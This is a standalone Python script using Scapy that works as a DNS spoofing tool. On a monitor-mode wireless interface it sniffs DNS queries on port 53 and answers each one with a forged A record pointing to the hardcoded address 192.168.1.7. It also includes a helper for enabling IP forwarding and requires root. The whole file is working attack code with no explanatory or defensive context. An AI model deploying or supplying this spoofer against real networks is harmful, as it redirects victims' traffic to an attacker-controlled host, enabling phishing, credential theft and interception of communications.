#!/usr/bin/env python

import logging
#logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import subprocess
import signal
import time
import sys
import os

conf.iface = 'mon0'
spoofed_ip = '192.168.1.7'

def forward_ip(enable=True):
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fw:
        if enable:
            ret = subprocess.Popen(['echo', '1'], stdout=fw)
        else:
            ret = subprocess.Popen(['echo', '0'], stdout=fw)
        if ret == 1:
            logging.error("ERROR SETTING IP FORWARDING")
            sys.exit(1)

def send_response(resp):
    req_domain = resp[DNS].qd.qname
    logging.info("Found request for {0}".format(req_domain))

    del(resp[UDP].len)
    del(resp[UDP].chksum)
    del(resp[IP].len)
    del(resp[IP].chksum)

    response = resp.copy()

    response.FCfield = 2L
    response[Ether].src, response[Ether].dst = resp[Ether].dst, resp[Ether].src
    response[IP].src, response[IP].dst = resp[IP].dst, resp[IP].src
    response.sport, response.dport = resp.dport, resp.sport

    response[DNS].qr = 1L
    response[DNS].ra = 1L
    response[DNS].ancount = 1
    response[DNS].an = DNSRR(
            rrname = req_domain,
            type = 'A',
            rclass = 'IN',
            ttl = 900,
            rdata = spoofed_ip
            )
    del(response[IP].len)
    del(response[UDP].len)
    del(response[UDP].chksum)

    sendp(response)
    logging.info("Send Response: {0} -> {1}".format(req_domain, spoofed_ip))

def main():
    print("Starting...")
    sniff(prn=lambda x: send_response(x),
            lfilter=lambda x: x.haslayer(UDP) and x.dport == 53)

if __name__ == "__main__":
    logging.basicConfig(format='%(levelname)s: %(message)s',
            level=logging.DEBUG)
    if os.geteuid() != 0:
        logging.info("[-] You must be root to run this.")
        sys.exit(1)

    main()
